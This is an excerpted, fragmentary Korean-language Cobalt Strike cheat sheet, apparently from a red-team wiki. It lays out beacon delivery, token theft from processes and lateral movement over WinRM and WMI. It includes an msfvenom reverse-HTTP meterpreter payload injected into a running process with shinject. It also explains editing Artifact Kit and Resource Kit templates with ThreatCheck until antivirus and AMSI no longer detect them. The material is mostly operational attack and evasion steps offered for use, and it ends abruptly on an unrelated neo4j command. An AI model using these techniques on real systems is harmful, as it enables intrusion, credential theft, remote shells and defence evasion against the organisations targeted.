...
`Attacks -> Web Drive-by -> Scripted Web Delivery (S)` 이 명령은 비콘을 cobalt strike에서 다운로드하기 위한 스크립트/실행 파일을 생성합니다. 형식은 bitsadmin, exe, powershell 및 python과 같습니다.
...
## pid에서 토큰 훔치기
## make_token과 유사하지만 프로세스에서 토큰을 훔침
...
## make_token과 유사하게, 이는 Windows 이벤트 4624를 생성합니다: 계정이 성공적으로 로그인되었습니다. 그러나 로그온 유형은 2(LOGON32_LOGON_INTERACTIVE)입니다. 호출 사용자(TargetUserName)와 가장된 사용자(TargetOutboundUserName)를 자세히 설명합니다.
...
</strong>## winrm                           WinRM(파워셸)을 통해 원격 실행
## wmi                             WMI를 통해 원격 실행

## wmi로 비콘을 실행하려면 (jump 명령에 포함되지 않음) 비콘을 업로드하고 실행하면 됩니다.
...
## cobalt에서: Listeners > Add를 클릭하고 Payload를 Foreign HTTP로 설정합니다. Host를 10.10.5.120으로, Port를 8080으로 설정하고 저장을 클릭합니다.
beacon> spawn metasploit
## 외부 리스너로 x86 Meterpreter 세션만 생성할 수 있습니다.

# Metasploit에 세션 전달 - 셸코드 주입을 통해
## 메타플로잇 호스트에서
msfvenom -p windows/x64/meterpreter_reverse_http LHOST=&#x3C;IP> LPORT=&#x3C;PORT> -f raw -o /tmp/msf.bin
## msfvenom을 실행하고 multi/handler 리스너를 준비합니다.

## bin 파일을 cobalt strike 호스트로 복사
ps
shinject &#x3C;pid> x64 C:\Payloads\msf.bin # x64 프로세스에 메타스플로잇 셸코드 주입

# 메타스플로잇 세션을 코발트 스트라이크로 전달
...
보통 `/opt/cobaltstrike/artifact-kit`에서 코발트 스트라이크가 바이너리 비콘을 생성하는 데 사용할 코드와 미리 컴파일된 템플릿(`/src-common`)을 찾을 수 있습니다.

생성된 백도어(또는 컴파일된 템플릿)와 함께 [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck)를 사용하면 방어자가 트리거되는 원인을 찾을 수 있습니다. 보통 문자열입니다. 따라서 최종 바이너리에 해당 문자열이 나타나지 않도록 백도어를 생성하는 코드를 수정할 수 있습니다.

코드를 수정한 후 동일한 디렉토리에서 `./build.sh`를 실행하고 `dist-pipe/` 폴더를 Windows 클라이언트의 `C:\Tools\cobaltstrike\ArtifactKit`로 복사합니다.
```
...
템플릿과 함께 [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck)를 사용하면 방어자가 (이 경우 AMSI) 좋아하지 않는 것을 찾아 수정할 수 있습니다:
```
.\ThreatCheck.exe -e AMSI -f .\cobaltstrike\ResourceKit\template.x64.ps1
```
탐지된 라인을 수정하면 잡히지 않는 템플릿을 생성할 수 있습니다.

Cobalt Strike가 우리가 원하는 리소스를 디스크에서 사용하도록 지시하기 위해 공격적인 스크립트 `ResourceKit\resources.cna`를 로드하는 것을 잊지 마세요.
```bash
cd C:\Tools\neo4j\bin
neo4j.bat console
